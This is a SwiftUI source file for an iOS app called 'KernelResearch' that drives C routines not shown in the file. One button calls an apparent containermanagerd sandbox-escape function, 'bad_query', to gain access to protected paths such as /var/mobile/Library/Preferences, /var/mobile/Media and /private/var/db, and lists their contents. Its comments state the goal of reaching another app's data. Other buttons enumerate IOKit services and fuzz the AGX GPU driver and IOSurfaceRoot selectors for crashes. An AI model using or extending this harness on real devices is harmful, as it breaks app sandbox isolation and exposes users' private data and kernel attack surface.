import SwiftUI

// MARK: — Swift wrapper around C fuzzer callback

class FuzzLog: ObservableObject {
    @Published var lines: [String] = []

    func append(_ s: String) {
        DispatchQueue.main.async {
            self.lines.insert(s, at: 0)
            if self.lines.count > 500 { self.lines.removeLast() }
        }
    }
    func clear() {
        DispatchQueue.main.async { self.lines.removeAll() }
    }
}

// Bridge: C callback → Swift closure stored in a box
private class CallbackBox {
    let log: FuzzLog
    init(_ l: FuzzLog) { log = l }
}

// ── ContentView ───────────────────────────────────────────────────────────────

struct ContentView: View {
    @StateObject private var log = FuzzLog()
    @State private var running = false

    var body: some View {
        NavigationStack {
            VStack(spacing: 0) {
                // Action buttons
                ScrollView(.horizontal, showsIndicators: false) {
                    HStack(spacing: 10) {
                        ActionBtn("bad_query\nEscape", color: .orange) { runBadQuery() }
                        ActionBtn("Enumerate\nServices",  color: .blue)   { runEnumerate() }
                        ActionBtn("Fuzz AGX\nDriver",    color: .red)    { runFuzzAGX() }
                        ActionBtn("Fuzz\nIOSurface",     color: .purple) { runFuzzIOSurface() }
                        ActionBtn("Clear\nLog",          color: .gray)   { log.clear() }
                    }
                    .padding()
                }

                // Log view
                ScrollView {
                    LazyVStack(alignment: .leading, spacing: 2) {
                        ForEach(log.lines.indices, id: \.self) { i in
                            Text(log.lines[i])
                                .font(.system(size: 11, design: .monospaced))
                                .foregroundColor(lineColor(log.lines[i]))
                                .frame(maxWidth: .infinity, alignment: .leading)
                        }
                    }
                    .padding(.horizontal, 8)
                }
                .background(Color(white: 0.05))

                if running {
                    ProgressView("Fuzzing...")
                        .padding(6)
                        .foregroundColor(.yellow)
                }
            }
            .navigationTitle("KernelResearch")
            .navigationBarTitleDisplayMode(.inline)
            .background(Color.black)
        }
        .preferredColorScheme(.dark)
    }

    // MARK: — Actions

    private func runBadQuery() {
        guard !running else { return }
        running = true
        log.append("── bad_query ─────────────────────────────")

        DispatchQueue.global(qos: .userInitiated).async {
            // Test 1: system path traversal (no app group needed)
            // Try to get access to /var/mobile/Library/Caches
            let targetPath = "/var/mobile/Library/Caches"
            let handle = bad_query(
                UnsafeMutablePointer<CChar>(mutating: (targetPath as NSString).utf8String),
                false,   // create = false
                nil,     // group_identifier = nil → MCMSharedSystemDataContainer
                false    // is_group = false
            )

            if handle >= 0 {
                log.append("✓ bad_query handle=\(handle)  path=\(targetPath)")
                log.append("  Sandbox extension consumed — filesystem access granted")

                // Try to list the directory now that we have the extension
                var isDir: ObjCBool = false
                let exists = FileManager.default.fileExists(atPath: targetPath, isDirectory: &isDir)
                log.append("  FileManager.fileExists(\(targetPath)) = \(exists) isDir=\(isDir.boolValue)")

                if exists && isDir.boolValue {
                    do {
                        let items = try FileManager.default.contentsOfDirectory(atPath: targetPath)
                        log.append("  Directory entries: \(items.count)")
                        for item in items.prefix(10) {
                            log.append("    \(item)")
                        }
                    } catch {
                        log.append("  contentsOfDirectory error: \(error)")
                    }
                }

                bad_query_release(handle)
            } else {
                log.append("✗ bad_query FAILED for \(targetPath)")
                log.append("  Possible: iOS version mismatch, containermanagerd patched")
            }

            // Test 2: app container traversal — access another app's Documents
            // Try a few well-known system paths
            let paths = [
                "/var/mobile/Library/Preferences",
                "/var/mobile/Media",
                "/private/var/db",
            ]
            for p in paths {
                let h2 = bad_query(
                    UnsafeMutablePointer<CChar>(mutating: (p as NSString).utf8String),
                    false, nil, false
                )
                if h2 >= 0 {
                    var isDir: ObjCBool = false
                    let ok = FileManager.default.fileExists(atPath: p, isDirectory: &isDir)
                    log.append("✓ \(p) → handle=\(h2) accessible=\(ok)")
                    bad_query_release(h2)
                } else {
                    log.append("✗ \(p) → failed")
                }
            }

            DispatchQueue.main.async { self.running = false }
        }
    }

    private func runEnumerate() {
        guard !running else { return }
        running = true
        log.append("── IOKit Service Enumeration ──────────────")

        DispatchQueue.global(qos: .userInitiated).async {
            var outPtr: UnsafeMutablePointer<CChar>? = nil
            let count = iokit_enumerate_services(&outPtr)

            if let ptr = outPtr {
                let str = String(cString: ptr)
                free(ptr)
                for line in str.components(separatedBy: "\n") where !line.isEmpty {
                    log.append(line)
                }
            }
            log.append("── Total opened: \(count) service(s)")
            DispatchQueue.main.async { self.running = false }
        }
    }

    private func runFuzzAGX() {
        guard !running else { return }
        running = true
        log.append("── Fuzzing AGXMetalA16 ────────────────────")
        log.append("  selectors 0..255 × 16 rounds per selector")

        DispatchQueue.global(qos: .userInitiated).async {
            // Use a retained box so the C callback closure captures log safely
            let box = CallbackBox(log)
            let boxPtr = Unmanaged.passRetained(box).toOpaque()

            let hits = iokit_fuzz_agx({ entryPtr, ctx in
                guard let entry = entryPtr?.pointee,
                      let ctx = ctx else { return 0 }
                let b = Unmanaged<CallbackBox>.fromOpaque(ctx).takeUnretainedValue()
                let line: String
                switch entry.result {
                case FUZZ_RESULT_OK:
                    line = "  AGX OK    \(String(cString: entry.detail))"
                case FUZZ_RESULT_PANIC:
                    line = "*** AGX CRASH  sel=\(entry.selector) — PORT DIED"
                case FUZZ_RESULT_ERROR:
                    line = "  AGX ERR   \(String(cString: entry.detail))"
                default:
                    line = "  AGX ???   \(String(cString: entry.detail))"
                }
                b.log.append(line)
                return 0
            }, boxPtr)

            Unmanaged<CallbackBox>.fromOpaque(boxPtr).release()
            log.append("── AGX fuzz done. Interesting hits: \(hits)")
            DispatchQueue.main.async { self.running = false }
        }
    }

    private func runFuzzIOSurface() {
        guard !running else { return }
        running = true
        log.append("── Fuzzing IOSurfaceRoot ──────────────────")

        DispatchQueue.global(qos: .userInitiated).async {
            let box = CallbackBox(log)
            let boxPtr = Unmanaged.passRetained(box).toOpaque()

            let hits = iokit_fuzz_iosurface({ entryPtr, ctx in
                guard let entry = entryPtr?.pointee, let ctx = ctx else { return 0 }
                let b = Unmanaged<CallbackBox>.fromOpaque(ctx).takeUnretainedValue()
                switch entry.result {
                case FUZZ_RESULT_PANIC:
                    b.log.append("*** IOSurface CRASH  sel=\(entry.selector) — PORT DIED")
                case FUZZ_RESULT_OK:
                    b.log.append("  Surface OK  \(String(cString: entry.detail))")
                default: break
                }
                return 0
            }, boxPtr)

            Unmanaged<CallbackBox>.fromOpaque(boxPtr).release()
            log.append("── IOSurface fuzz done. Interesting hits: \(hits)")
            DispatchQueue.main.async { self.running = false }
        }
    }

    // MARK: — Helpers

    private func lineColor(_ line: String) -> Color {
        if line.contains("***")         { return .red }
        if line.contains("CRASH")       { return .red }
        if line.contains("FAIL")        { return .orange }
        if line.contains("✓")           { return .green }
        if line.contains("✗")           { return .red }
        if line.contains("OK")          { return Color(red: 0.4, green: 1, blue: 0.4) }
        if line.hasPrefix("──")         { return .yellow }
        return .gray
    }
}

// MARK: — Action button component

struct ActionBtn: View {
    let label: String
    let color: Color
    let action: () -> Void

    init(_ label: String, color: Color, action: @escaping () -> Void) {
        self.label = label; self.color = color; self.action = action
    }

    var body: some View {
        Button(action: action) {
            Text(label)
                .font(.system(size: 12, weight: .semibold, design: .monospaced))
                .multilineTextAlignment(.center)
                .foregroundColor(.white)
                .padding(.vertical, 8)
                .padding(.horizontal, 14)
                .background(color.opacity(0.85))
                .cornerRadius(8)
        }
    }
}
